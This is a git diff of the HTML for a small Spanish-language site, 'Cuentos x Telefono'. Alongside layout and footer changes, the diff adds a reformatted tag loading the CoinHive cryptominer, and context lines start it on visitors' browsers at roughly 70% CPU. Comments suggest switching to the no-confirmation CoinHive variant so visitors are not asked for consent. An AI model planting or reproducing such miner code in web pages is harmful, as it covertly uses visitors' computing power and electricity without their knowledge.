@@ -3,8 +3,8 @@
   <head>
     <!-- Meta tags -->
     <meta charset="utf-8">
-    <title>Cuentos x Telefono</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Cuentos x Telefono</title>
 
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
@@ -14,8 +14,7 @@
 
     <!-- CoinHive: Para aprovechar mientras debug -->
     <!-- Cambiar authedmine a coinhive para no confirmación -->
-    <script src
-    ="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
       // Throttle es el porcentaje del procesador que NO será usado
     	var miner = new CoinHive.Anonymous('45C1t3GAk3I0Tuh1nV2zBSpDZ7ZpDBYx', {throttle: 0.3});
@@ -37,11 +36,15 @@
         </div>
       </div>
       <p class="container"> Por aquí abajo es donde va lo de las lineas abiertas y esas cosas </p>
+      <div>
+        <!-- Incluimos lo de las lineas -->
+        <script src="./js/printLineas.js"></script>
+      </div>
     </main>
-    <footer class="container">
-      <div id="row">
-        <p>Made w/ ❤ by <a href="https://ddavo.me">David Davó</a></p>
-        <p>Crea tu propio droplet en <a href="https://m.do.co/c/3e57ed1c8623">DigitalOcean</div></p>
+    <footer class="footer">
+      <div class="container">
+        <p>Made w/ ❤ by <a href="https://ddavo.me">David Davó</a><br>
+        Crea tu propio droplet en <a href="https://m.do.co/c/3e57ed1c8623">DigitalOcean</div></p>
       </div>
     </footer>
   </body>
